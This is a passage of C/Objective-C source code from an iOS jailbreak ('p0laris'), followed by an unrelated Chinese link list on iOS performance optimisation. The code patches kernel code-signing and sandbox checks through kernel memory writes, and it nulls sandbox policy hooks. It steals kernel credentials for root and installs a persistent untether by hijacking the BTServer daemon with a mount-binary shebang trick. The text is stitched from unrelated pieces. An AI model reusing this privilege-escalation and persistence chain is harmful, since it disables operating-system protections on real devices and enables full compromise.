	 */
	lprintf("patching proc_enforce: 0x%08x,0x%08x",
			kernel_base + offsets->proc_enforce,
			0x0);
	kwrite_uint32(kernel_base + offsets->proc_enforce,0);
	
	/* 
	 *  cs_enforcement_disable_amfi
	 */
	lprintf("patching cs_enforcement_disable_amfi: 0x%08x,0x%04x",
			kernel_base + offsets->cs_enforcement_disable_amfi - 1,
			0x0101);
	kwrite_uint8(kernel_base + offsets->cs_enforcement_disable_amfi, 1);
	kwrite_uint8(kernel_base + offsets->cs_enforcement_disable_amfi - 1, 1);
	
	/* 
	 *  PE_i_can_has_debugger -> 1
	 */
	lprintf("patching PE_i_can_has_debugger_1: 0x%08x,0x%08x",
			kernel_base + offsets->PE_i_can_has_debugger_1,
			0x1);
	kwrite_uint32(kernel_base + offsets->PE_i_can_has_debugger_1, 1);

	lprintf("patching PE_i_can_has_debugger_2: 0x%08x,0x%08x",
			kernel_base + offsets->PE_i_can_has_debugger_2,
			0x1);
	kwrite_uint32(kernel_base + offsets->PE_i_can_has_debugger_2, 1);
	
	/* 
	 *  vm_fault_enter magic
	 */
	lprintf("patching vm_fault_enter_patch: 0x%08x,0x%04x",
			kernel_base + offsets->vm_fault_enter_patch,
			0x2201);
	kwrite_uint8(kernel_base + offsets->vm_fault_enter_patch, 0x01);
	kwrite_uint8(kernel_base + offsets->vm_fault_enter_patch + 1, 0x22);
	
	/*
	 *  vm_map_enter_patch
	 */
	lprintf("patching vm_map_enter_patch: 0x%08x,0x%08x",
			kernel_base + offsets->vm_map_enter_patch,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->vm_map_enter_patch, 0xbf00bf00);
	
	/*
	 * mapForIO magic
	 */
	lprintf("patching mapForIO: 0x%08x,0x%08x",
			kernel_base + offsets->mapForIO,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->mapForIO, 0xbf00bf00);
	
	/*
	 *  csops magic
	 */
	lprintf("patching csops: 0x%08x,0x%08x",
			kernel_base + offsets->csops,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->csops, 0xbf00bf00);
	
	/*
	 *  amfi_file_check_mmap magic
	 */
	lprintf("patching amfi_file_check_mmap: 0x%08x,0x%08x",
			kernel_base + offsets->amfi_file_check_mmap,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->amfi_file_check_mmap, 0xbf00bf00);
	
	/*
	 *  sandbox_call_i_can_has_debugger magic
	 */
	lprintf("patching sandbox_call_i_can_has_debugger: 0x%08x,0x%08x",
			kernel_base + offsets->sandbox_call_i_can_has_debugger,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->sandbox_call_i_can_has_debugger,0xbf00bf00);
	
	/*
	 *  lwvm
	 */
	lprintf("patching lwvm1: 0x%08x,0x%08x",
			kernel_base + offsets->lwvm1,
			0xf8d1e00f);
	kwrite_uint32(kernel_base + offsets->lwvm1, 0xf8d1e00f);

	lprintf("patching lwvm2: 0x%08x,0x%08x",
			kernel_base + offsets->lwvm2,
			0x2501e003);
	kwrite_uint32(kernel_base + offsets->lwvm2, 0x2501e003);

	lprintf("patching lwvm_call: 0x%08x,0x%08x",
			kernel_base + offsets->lwvm_call,
			kernel_base + offsets->lwvm_call_offset);
	kwrite_uint32(kernel_base + offsets->lwvm_call,
				  kernel_base + offsets->lwvm_call_offset);
	
	/*
	 *  tfp0
	 */
	lprintf("patching tfp0: 0x%08x,0x%08x->0x%08x",
			kernel_base + offsets->tfp0,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->tfp0, 0xbf00bf00);
	
	/*
	 *  fuck the sandbox
	 */
	lprintf("nuking sandbox @ 0x%08x", kernel_base + offsets->sbops);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0);
	
	/*
	 *  get kernel credentials so we can get our friend, uid=0.
	 */
	lprintf("stealing kernel creds");
	uint32_t allproc_read	= kread_uint32(kernel_base + offsets->allproc);
	lprintf("uint32_t allproc = 0x%08x, uint32_t allproc_read = 0x%08x;",
			kernel_base + offsets->allproc,
			allproc_read);
	pid_t our_pid		= getpid();
	lprintf("our_pid = %d", our_pid);
	
	myproc				= 0;
	uint32_t kernproc	= 0;
	
	/*
	 *  this code traverses a linked list in kernel memory to find the processes.
	 *  cleaned up
	 * 
	 *  struct proc {
	 * 	 LIST_ENTRY(proc) p_list;	// List of all processes.		//
	 * 
	 * 	 pid_t	   p_pid;		  // Process identifier. (static)	//
	 * 	 void *	  task;		   // corresponding task (static)		//
	 * 	 ...
	 *  };
	 * 
	 *  #define LIST_ENTRY(type)											\
	 *  struct {															\
	 * 	 struct type *le_next;		// next element						//  \
	 * 	 struct type **le_prev;		// address of previous next element //  \
	 *  }
	 * 
	 *  sizeof(uintptr_t) on 32-bit = 4
	 *  2 pointers = 2 * 4 = 8
	 *  offset of p_pid = 8
	 *  the next proc entry is the first pointer in the LIST_ENTRY struct, which is conveniently
	 *  the first element in the proc struct.
	 *  therefore, offset of the next proc entry is 0
	 * 
	 *  loop through the linked list by getting allproc
	 *  check the pid, and compare it to ours or the kernels
	 *  save it if it's either, otherwise continue
	 * 
	 *  eventually at the end we have the addresses of the kernel's proc struct and ours.
	 *  now we do writing magic to get kernel privs :P
	 */
	
	if (allproc_read != 0) {
		while (myproc == 0 || kernproc == 0) {
			uint32_t kpid = kread_uint32(allproc_read + 8);
			if (kpid == our_pid) {
				myproc = allproc_read;
				lprintf("found myproc 0x%08x, %d", myproc, kpid);
			} else if (kpid == 0) {
				kernproc = allproc_read;
				lprintf("found kernproc 0x%08x, %d", kernproc, kpid);
			}
			allproc_read = kread_uint32(allproc_read);
		}
	} else {
		/* fail */
		return false;
	}
	
	/*
	 *  TODO: don't hardcode 0xa4, ideally write patchfinder code for it
	 */
	
	uint32_t kern_ucred = kread_uint32(kernproc + 0xa4);
	lprintf("uint32_t kern_ucred = 0x%08x;", kern_ucred);
	
	ourcred = kread_uint32(myproc + 0xa4);
	lprintf("uint32_t ourcred = 0x%08x;", ourcred);

	/*
	 *  i am (g)root
	 */
	kwrite_uint32(myproc + 0xa4, kern_ucred);
	setuid(0);
	
	return ret;
}

void easy_spawn(char* bin, char* argv[]) {
	pid_t pid;
	int status;
	status = posix_spawn(&pid, bin, NULL, NULL, argv, environ);
	if (status == 0) {
		lprintf("Child pid: %i", pid);
		do {
			if (waitpid(pid, &status, 0) != -1) {
				lprintf("Child status %d", WEXITSTATUS(status));
			} else {
				perror("waitpid");
			}
		} while (!WIFEXITED(status) && !WIFSIGNALED(status));
	} else {
		lprintf("posix_spawn: %s", strerror(status));
	}
}

NSString* resource_path = NULL;
char* bundle_path(char* path) {
	char* ret = NULL;
	
	if (!resource_path)
		resource_path = [[NSBundle mainBundle] resourcePath];
	
	ret = (char*)[[resource_path stringByAppendingPathComponent:
				   [NSString stringWithUTF8String:path]] UTF8String];
	
	return ret;
}

#if INSTALL_UNTETHER
#if !INSTALL_NONPUBLIC_UNTETHER
bool install_untether(void) {
	bool ret = true;
	
	/*
	 *  if re-installing, remove the previous untether directory
	 */
	run_cmd("rm -rf /untether");
	
	/*
	 *  probably shouldn't be 777, will look into later
	 */
	mkdir("/untether", 0777);
	
	/*
	 *  get path of p0laris, and symlink it for the final 0wnage
	 */
	char* bin_path = bundle_path("p0laris");
	symlink(bin_path, "/untether/p0laris");
	
	/*
	 *  make /usr/local/bin
	 *  sandbox policy bypass allows you to use arbitrary interpreter binaries
	 *  IF you put them at specific locations.
	 *  you can not use a symlink, the actual binary must be at the location.
	 *  decompiled sandbox policies:
	 *    (deny process-exec-interpreter
	 *    (require-all
	 * 	(require-not (debug-mode))
	 * 	(require-all (require-not (literal "/bin/sh"))
	 * 	 (require-not (literal "/bin/bash"))
	 * 	 (require-not (literal "/usr/bin/perl"))
	 * 	 (require-not (literal "/usr/local/bin/scripter"))		<- i use this one
	 * 	 (require-not (literal "/usr/local/bin/luatrace"))
	 * 	 (require-not (literal "/usr/sbin/dtrace")))))
	 * 
	 *   source: https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-1.html
	 */
	mkdir("/usr/local/", 0777);
	mkdir("/usr/local/bin/", 0777);
	
	/*
	 *  important:
	 *  DO NOT symlink, this will not work,
	 *  as the binary will still be located at its previous path.
	 * 
	 *  actually copy the full executable, permissions and all, to the new path.
	 */
	run_cmd("/bin/cp -p /sbin/mount /usr/local/bin/scripter");
	
	/*
	 *  now for the actual persistence bug.
	 *  this next bit is stolen from the untether gist, as i'm too lazy to rewrite it.
	 *
	 *  bug3:
	 *  platform-application bypass,
	 *  custom filesystem
	 *  directory structure:
	 *  /System/Library/Filesystems/hax.fs:
	 *  /System/Library/Filesystems/hax.fs/Contents:
	 *  /System/Library/Filesystems/hax.fs/Contents/Resources:
	 *  /System/Library/Filesystems/hax.fs/Contents/Resources/mount_hax -> symlink to your haxxx
	 *
	 *  cp -p /sbin/mount to /usr/local/bin/scripter (bypass some sandbox stuff)
	 *  replace a daemon with an executable containing this:
	 *  #!/usr/local/bin/scripter -t hax fake
	 *
	 *
	 *
	 *  the last argument is automatically filled in with the executable path,
	 *  so mount finds an existing path, and attempts to mount "fake" (taken as /fake as it runs in /)
	 *  on that path, with the filesystem hax, which executes our code.
	 *  replace a daemon like wifiFirmwareLoaderLegacy
	 *  either do the same SUID trick, for untethered, sandboxed code exec as mobile (tired)
	 *  or use psychicpaper and get untethered, unsandboxed code exec as root (wired)
	 *  boom, BFU code exec on 9.xish -> 12.xish
	 *
	 *  BACK TO MY COMMENTS
	 *  i find it a little more smexy to use a symlink and keep
	 *  code_exec_fs.fs in a folder along with the rest of the vuln stuff, so symlinks abound
	 */
	
	mkdir("/untether/code_exec_fs.fs",						 0755);
	mkdir("/untether/code_exec_fs.fs/Contents",			 0755);
	mkdir("/untether/code_exec_fs.fs/Contents/Resources",	0755);
	
	symlink("/untether/code_exec_fs.fs",	"/System/Library/Filesystems/code_exec_fs.fs");
	symlink("/untether/code_exec_fs.fs",	"/Library/Filesystems/code_exec_fs.fs");
	symlink("/untether/p0laris",			"/untether/code_exec_fs.fs/Contents/Resources/mount_code_exec_fs");
	
	/*
	 *  i forgot to add you actually need to have
	 *  some data after the shebang, otherwise it won't work.
	 */
	FILE* fp = fopen("/untether/get_code_exec", "w");
	fprintf(fp, "#!/usr/local/bin/scripter -t code_exec_fs untether\n\n\nkek");
	fclose(fp);
	
	/*
	 *  chmod'ing for security & being able to execute and shit
	 */
	chown("/untether/p0laris",													501, 501);
	chown("/untether/code_exec_fs.fs/Contents/Resources/mount_code_exec_fs",	501, 501);
	chown("/untether/get_code_exec",											501, 501);
	chmod("/untether/p0laris",													04755);
	chmod("/untether/code_exec_fs.fs/Contents/Resources/mount_code_exec_fs",	04755);
	chmod("/untether/get_code_exec",											04755);
	
	/*
	 *  don't remove original wifiFirmwareLoader in case we're re-installing,
	 *  only rename original if the path used for the "backup", so to speak
	 *  exists.
	 */
	if (!exists("/usr/sbin/BTServer_"))
		rename("/usr/sbin/BTServer",	"/usr/sbin/BTServer_");
	
	symlink("/untether/get_code_exec",				"/usr/sbin/BTServer");
	
	/*
	 *  more chmod'ing
	 */
	chown("/usr/sbin/BTServer",	501, 501);
	chown("/untether/get_code_exec",			501, 501);
	chown("/usr/local/bin/scripter",			501, 501);
	
	chmod("/usr/sbin/BTServer",	04755);
	chmod("/untether/get_code_exec",			04755);
	chmod("/usr/local/bin/scripter",			04755);
	
	/*
	 *  logging, also so the patchfinder can grab offsets from the filesystem,
	 *  instead of patchfinding every time, which is slow...
	 */
	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
	NSString *documentsDirectory = [paths firstObject];
	char* doc_dir = (char*)[documentsDirectory UTF8String];
	
	symlink(doc_dir, "/untether/docs");
	
#if DO_CSBYPASS
	/*
	 *  logs
	 */
	lprintf("SPV vs CODESIGNING!\n");
	lprintf("FIGHT!\n");
	
	/*
	 * find csbypass in the app container
	 */
	char* csbypass = bundle_path("csbypass");
	
	/*
	 *  copy it to the untether folder & make it executable
	 */
	run_cmd("/bin/cp %s /untether/csbypass", csbypass);
	run_cmd("chmod 755 /untether/csbypass");
	
	/*
	 *  find game over in the app container
	 */
	char* game_over_armv7 = bundle_path("game_over_armv7.dylib1");
	
	/*
	 *  copy it to the untether folder & make it executable
	 */
	run_cmd("/bin/cp %s /untether/game_over_armv7.dylib1", game_over_armv7);
	run_cmd("chmod 755 /untether/game_over_armv7.dylib1");
	
	/*
	 *  get time
	 */
	time_t val = time(NULL);
	
	/*
	 *  write time for offsetting
	 */
	FILE* fp_ = fopen("/untether/offset", "wb");
	fwrite(&val, sizeof(val), 1, fp_);
	fclose(fp);
	
	/*
	 *  set time to zero
	 */
	lprintf("[*] __OFFSET *should* equal %ld", val);
	run_cmd("/bin/date -s @0");
	
	/*
	 *  nuke timed
	 */
	run_cmd("mv /System/Library/LaunchDaemons/com.apple.timed.plist /System/Library/LaunchDaemons/com.apple.timed.plist_");
	
	/*
	 *  0wn codesigning
	 */
	_0wn();
	
	/*
	 *  taunting...
	 */
	lprintf("[*] game over, codesigning. would you like to try again?");
#endif
	
	lprintf("[*] untether should be haxd on now");
	
	/*
	 *  sync, if we're already jailbroken
	 *  and the untether is now triggering,
	 *  we might panic to all hell and back
	 */
	sync();
	sync();
	sync();
	sync();
	sync();
	
	/* todo */
	
	return ret;
}
#else
#error This isn't enabled anymore, censored for public release: the mount bug was chosen. Nice job being curious, though! :)
#endif
#endif

bool extract_bootstrap(void) {
	bool re_extracting = false;
	bool ret = true;
	
	if (exists("/.p0laris") || exists("/.installed_home_depot")) {
		re_extracting = true;
		lprintf("k? guess we're re-extracting then. your choice, i guess? ...");
	}
	
	progress_ui("getting bundle paths");
	char* tar_path = bundle_path("tar");
	char* launchctl_path = bundle_path("launchctl");
	char* cydia_path = bundle_path("Cydia-9.0r4-Raw.tar");
	
	chmod(tar_path, 0777);
	
	/*
	 *  extract bootstrap
	 */
	progress_ui("extracting, this might take a while");
	chmod(tar_path, 0777);
	char* argv_[] = {tar_path, "-xf", cydia_path, "-C", "/", "--preserve-permissions", NULL};
	easy_spawn(tar_path, argv_);
	
	/*
	 *  touch cydia_no_stash (disable stashing, not included yet)
	 */
	progress_ui("disabling stashing");
	run_cmd("/bin/touch /.cydia_no_stash");
	
	/*
	 *  copy tar
	 */
	progress_ui("copying tar");
	run_cmd("/bin/cp -p %s /bin/tar", tar_path);
	
	/*
	 *  copy launchctl
	 */
	progress_ui("copying launchctl");
	run_cmd("/bin/cp -p %s /bin/launchctl", launchctl_path);
	
	/*
	 *  make them exectuable
	 */
	chmod("/bin/tar", 0755);
	chmod("/bin/launchctl", 0755);
	
	/*
	 *  i don't remember where this is from, Home Depot / Phoenix?
	 */
	chmod("/private", 0755);
	chmod("/private/var", 0755);
	chmod("/private/var/mobile", 0711);
	chmod("/private/var/mobile/Library", 0711);
	chmod("/private/var/mobile/Library/Preferences", 0755);
	
	mkdir("/Library/LaunchDaemons", 0777);
	
#if INSTALL_UNTETHER
	progress_ui("installing untether");
	install_untether();
	progress_ui("installed untether");
#endif
	
	if (!exists("/.p0laris")) {
		FILE* fp = fopen("/.p0laris", "w");
		fprintf(fp, "please don't delete this, the sky will fall and stuff or something\n"
				"  - p0laris, with love from spv.\n");
		fclose(fp);
	}
	
	sync();
	sync();
	sync();
	sync();
	sync();
	
	return ret;
}

#if DO_CSBYPASS
/*
 *  codesigning exploit is unfinished
 */
bool csbypass_wrapper(void) {
	bool ret = true;
	
	bool _0wnd = _0wn();
	lprintf("codesigning 0wnd: %s", _0wnd ? "true" : "false");
	
	sync();
	sync();
	sync();
	sync();
	sync();
	
#if 0
	uint32_t* comm_page_time = (uint32_t*)0xffff4048;
	while (*comm_page_time < 1000000000) {
		usleep(100000);
	}
	//	sleep(2);
#endif
	
	return ret;
}
#endif

bool post_jailbreak(void) {
	bool need_uicache = false;
	bool ret = true;
	
	if (global_untethered) {
		run_cmd("/usr/sbin/BTServer_");
#if DO_CSBYPASS
		csbypass_wrapper();
#endif
	}
	
	progress_ui("remounting /");
	char* nmr = strdup("/dev/disk0s1s1");
	int mntr = mount("hfs", "/", 0x10000, &nmr);
	lprintf("mount(...); = %d\n", mntr);
	
#if !FIRST_TIME_OVERRIDE
	if (!exists("/.p0laris") && !exists("/.installed_home_depot")) {
#endif
		progress_ui("extracting bootstrap");
		extract_bootstrap();
		need_uicache = true;
#if !FIRST_TIME_OVERRIDE
	}
#endif
	
#if INSTALL_UNTETHER
	if (!exists("/untether/p0laris")) {
		if (exists("/untether")) {
			progress_ui("fixing untether");
		} else {
			progress_ui("installing untether");
		}
		install_untether();
	}
#endif
	
	/*
	 *  doubleH3lix
	 */
	progress_ui("fixing springboard");
	NSMutableDictionary *md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
	
	[md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
	
	[md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
	
	progress_ui("restarting cfprefsd");
	run_cmd("/usr/bin/killall -9 cfprefsd &");
	
#if !FIRST_TIME_OVERRIDE
	if (need_uicache) {
#endif
		progress_ui("running uicache");
		run_cmd("su -c uicache mobile &");
#if !FIRST_TIME_OVERRIDE
	}
#endif
	
	progress_ui("loading launch daemons");
	run_cmd("/bin/launchctl load /Library/LaunchDaemons/*");
	run_cmd("/etc/rc.d/*");
	
	progress_ui("respringing");
	run_cmd("(killall -9 backboardd) &");
	
	if (!global_untethered) {
#if DO_CSBYPASS
		csbypass_wrapper();
#endif
	}
	
	return ret;
}

#define DUMP_LENGTH (32 * 1024 * 1024)

bool jailbreak(void) {
#if DUMP_KERNEL
	NSString *ns_doc_dir	= NULL;
#endif
	
	uint32_t before		 = -1;
	uint32_t after		  = -1;
	
#if DUMP_KERNEL
	NSArray *paths		  = NULL;
#endif
	
#if DUMP_KERNEL
	char* open_this		 = NULL;
	char* doc_dir		   = NULL;
	char* dump			  = NULL;
#endif
	
	bool ret				= false;
	
	progress_ui("exploiting kernel");
	
	tfp0 = get_kernel_task();
	
	lprintf("I live in a constant state of fear and misery");
	lprintf("Do you miss me anymore?");
	lprintf("And I don't even notice when it hurts anymore");
	lprintf("Anymore, anymore, anymore");
	
	progress_ui("exploited kernel");
	
	kernel_base = kbase();
	kaslr_slide = kernel_base - UNSLID_BASE;
	
#if DUMP_KERNEL
	dump = malloc(DUMP_LENGTH);
	
	dump_kernel(dump, DUMP_LENGTH);
	
	paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
												NSUserDomainMask,
												YES);
	ns_doc_dir = [paths firstObject];
	doc_dir = (char*)[ns_doc_dir UTF8String];
	asprintf(&open_this,
			 "%s/kernel_dump-%ld-0x%08x.bin",
			 doc_dir,
			 time(NULL),
			 kaslr_slide);
	
	FILE *f = fopen(open_this, "w");
	fwrite(dump,
		   1,
		   (32 * 1024 * 1024),
		   f);
	fclose(f);
	
	zfree(&dump);
	
	goto done;
#endif
	
#if ENABLE_DEBUG
	progress("got tfp0! tfp0=0x%x, kernel_base=0x%08x, kaslr_slide=0x%08x",
			 tfp0,
			 kernel_base,
			 kaslr_slide);
#endif
	
	progress_ui("patching pmap");
	patch_kernel_pmap();
	progress("patched pmap");
	
	progress_ui("checking pmap patch");
	
	before	= kread_uint32(kernel_base);
	kwrite_uint32(kernel_base, 0x41424344);
	after	= kread_uint32(kernel_base);
	kwrite_uint32(kernel_base, before);
	
#if ENABLE_DEBUG
	progress("kbase before: 0x%x, kbase after: 0x%x",
			 before,
			 after);
#endif
	
	/*
	 *  i commented out "before == 0xfeedface" as at times,
	 *  i will test kernel patches and/or other functionality
	 *  on an already jailbroken device, and don't feel like rebooting.
	 *  also so that you can re-install the untether without rebooting
	 *  after installing the application :P
	 */
	
	if (before != after && /* before == 0xfeedface && */ after == 0x41424344) {
		progress_ui("pmap patched!");
	} else {
		progress_ui("pmap patch failed");
		goto done;
	}
	
	progress_ui("cleaning up the kernel");
	exploit_cleanup(tfp0);
	
	progress_ui("patching kernel");
	if (!patch_kernel())
		goto done;
	progress_ui("patched kernel");
	
	progress_ui("doing post jailbreak work");
	post_jailbreak();
	
	/*
	 *  note: todo: save original uid in case unsandboxed root daemon
	 */
	
	kwrite_uint32(myproc + 0xa4, ourcred);
	setuid(501);
	
#if BTSERVER_USED
	if (global_untethered)
		run_cmd("launchctl bsexec .. /bin/sh -c \"(while true; do /usr/sbin/BTServer_; done) &\"");
#endif
	
#if UNPATCH_PMAP
	progress("unpatching pmap");
	pmap_unpatch();
	progress("unpatched pmap");
#endif
	
	ret = true;
	
	zfree(&offsets);
	
	syslog(LOG_SYSLOG, "we out here");
	
done:
	progress_ui("cleaning up");
	exploit_cleanup(tfp0);
	
	return ret;
}

bool _jailbreak(void) {
	return jailbreak();
}

```

## 奥德赛Odyssey iOS13.5.1-13.7越狱工具
#### https://theodyssey.dev/

## iOS 性能优化梳理：
### 基本工具、业务优化、内存优化、卡顿优化、布局优化、电量优化、 安装包瘦身、启动优化、网络优化等

#### iOS 官方文档
* [Performance 专题](https://developer.apple.com/library/content/navigation/#section=Topics&topic=Performance) 
* [Core Animation Programming Guide](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreAnimation_guide) 


#### iOS 性能优化相关书籍
* [Pro iOS Apps Performance Optimization](http://download.csdn.net/detail/tskyming/9831453)
* [High Performance iOS Apps](http://download.csdn.net/detail/tskyming/9831465)
* [iOS-Core-Animation-Advanced-Techniques](https://github.com/AttackOnDobby/iOS-Core-Animation-Advanced-Techniques)

#### Instruments 工具相关
* [Instruments User Guide](https://developer.apple.com/library/content/documentation/DeveloperTools/Conceptual/InstrumentsUserGuide/index.html) [中文翻译-PDF](http://cdn.cocimg.com/bbs/attachment/Fid_6/6_24457_90eabb4ed5b3863.pdf) 
* [Instruments之Leaks学习](http://www.cnblogs.com/lxlx1798/p/6933485.html) 
* [Instruments学习之Allocations](http://www.cnblogs.com/lxlx1798/p/6933195.html) 
* [instrument之Time Profiler总结](http://www.cnblogs.com/lxlx1798/p/6933604.html)
* [Instruments学习之Core Animation学习](http://www.cnblogs.com/lxlx1798/p/6933364.html) 
* [Instruments之Activity Monitor使用入门](http://www.cnblogs.com/lxlx1798/p/6933141.html) 

#### GMTC-2018 PPT
* [LinkedIn移动应用的性能优化之道](https://ppt.geekbang.org/slide/show?cid=31&pid=1495)
* [美团客户端监控与异常排查实践](https://ppt.geekbang.org/slide/show?cid=31&pid=1500)
* [爱奇艺APP极致体验之路](https://ppt.geekbang.org/slide/show?cid=31&pid=1497)
* [大前端时代前端监控的最佳实践](https://ppt.geekbang.org/slide/show?cid=31&pid=1496)
* [性能优化与监控专题PPT](https://gmtc.infoq.cn/2019/beijing/)

#### 综合篇
* [WWDC2012-235-iOS APP Performance:Responsiveness](https://developer.apple.com/videos/play/wwdc2012/235)
* [微信读书iOS性能优化](http://wereadteam.github.io/2016/05/03/WeRead-Performance/)
* [微信读书 iOS 质量保证及性能监控](http://wereadteam.github.io/2016/12/12/Monitor/)
* [深入剖析 iOS 性能优化](https://ming1016.github.io/2017/06/20/deeply-ios-performance-optimization/)
* [魔窗研发副总裁沈哲：移动端SDK的优化之路](http://blog.csdn.net/magicwindow/article/details/51423463)
* [搜狗输入法 iOS 版开发与优化实践](http://www.cocoachina.com/design/20160905/17483.html)[PPT](https://github.com/MDCC2016/iOS-Session-Slides/blob/master/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E5%AE%9E%E8%B7%B5-%E6%9D%8E%E8%85%BE%E6%9D%B0.pdf)
* [蘑菇街 App 的稳定性与性能实践](http://www.infoq.com/cn/presentations/stability-and-performance-of-mogujie-app)[PPT](https://sanwen8.cn/p/6e5c888.html)
* [⼿淘iOS性能优化探索](http://pstatic.geekbang.org/pdf/593a53d813cef.pdf?e=1497499485&token=eHNJKRTldoRsUX0uCP9M3icEhpbyh3VF9Nrk5UPM:sa-xp_aIeIhtiWbqR-hY4ImMzFc=)
* [iOS App 稳定性指标及监测](https://juejin.im/post/58ca0832a22b9d006418fe43)

#### 内存优化
* [Memory Usage Performance Guidelines](https://developer.apple.com/library/content/documentation/Performance/Conceptual/ManagingMemory/ManagingMemory.html#//apple_ref/doc/uid/10000160i) 
* [WWDC-2018-416](https://developer.apple.com/videos/play/wwdc2018/416/)[中文翻译](https://juejin.im/post/5b23dafee51d4558e03cbf4f)
* [探索iOS内存分配](https://juejin.im/post/5a5e13c45188257327399e19) 
* [iOS微信内存监控](http://wetest.qq.com/lab/view/367.html?from=content_juejin)
* [内存管理及优化(上)-QQ浏览器](https://www.imooc.com/video/11075)
* [内存管理及优化(下)-QQ浏览器](https://www.imooc.com/video/11076)
* [OOM探究：XNU 内存状态管理](https://www.jianshu.com/p/4458700a8ba8)

#### 卡顿优化
* [UIKit性能调优实战讲解](http://www.cocoachina.com/ios/20160208/15238.html?utm_source=tuicool&utm_medium=referral)
* [QQ空间掉帧率优化实战](http://wetest.qq.com/lab/view/354.html)
* [实现 60fps 的网易云音乐首页](https://mp.weixin.qq.com/s?__biz=MzA4MzEwOTkyMQ==&mid=2667379069&idx=1&sn=376d9ef2261cf13e930406f1c35d3569) 
* [iOS 保持界面流畅的技巧](http://blog.ibireme.com/2015/11/12/smooth_user_interfaces_for_ios/)
* [iOS UI性能优化总结](http://www.cocoachina.com/ios/20180412/22990.html)
* [微信iOS卡顿监控系统](http://mp.weixin.qq.com/s?__biz=MzAwNDY1ODY2OQ%3D%3D&idx=1&mid=207890859&scene=23&sn=e98dd604cdb854e7a5808d2072c29162&srcid=0921FzoCw9j1W7n4uFYKuarC#rd)
* [iOS-卡顿检测](http://www.cnblogs.com/gatsbywang/p/5555200.html)
* [iOS监控：卡顿检测](http://ios.jobbole.com/93085/)
